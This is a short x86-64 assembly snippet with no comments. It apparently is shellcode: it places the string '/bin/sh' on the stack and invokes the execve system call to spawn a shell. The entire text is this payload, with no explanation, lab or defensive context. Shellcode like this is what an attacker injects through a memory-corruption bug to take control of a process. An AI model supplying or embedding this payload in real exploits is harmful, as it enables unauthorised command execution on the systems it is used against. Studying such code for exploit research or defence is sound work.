mov rbx, 0x68732f6e69622f
push rbx
push rsp
pop rdi
xor esi, esi
xor edx, edx
push 0x3b
pop rax
syscall
